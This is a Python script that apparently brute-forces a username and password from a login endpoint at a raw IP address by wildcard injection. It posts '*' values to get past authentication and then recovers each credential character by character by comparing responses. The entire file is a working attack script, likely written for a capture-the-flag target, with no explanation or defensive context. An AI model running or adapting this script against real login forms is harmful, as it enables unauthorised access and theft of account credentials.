import requests
import string

checkLetters = string.printable.replace("*", '')

def doRequest(username, password):
    return requests.post("http://188.166.173.208:32662/login", data={
        'username': username,
        'password': password,
    }).text


failed_attempt = doRequest("a", "a")
success_attempt = doRequest("*", "*")

username = ""
password = ""
try:
    while True:
        for char in checkLetters:
            print("Trying: " + username + char + "*")
            res = doRequest(username + char + "*", "*")
            if res == success_attempt:
                username += char
                if doRequest(username, "*") == success_attempt:
                    raise Exception()
                break
except:
    print("Username: " + username)

try:
    while True:
        for char in checkLetters:
            print("Trying: " + password + char + "*")
            res = doRequest(username, password + char + "*")
            if res == success_attempt:
                password += char
                if doRequest(username, password) == success_attempt:
                    raise Exception()
                break
except:
    print("Password: " + password)

print("Username: " + username)
print("Password: " + password)
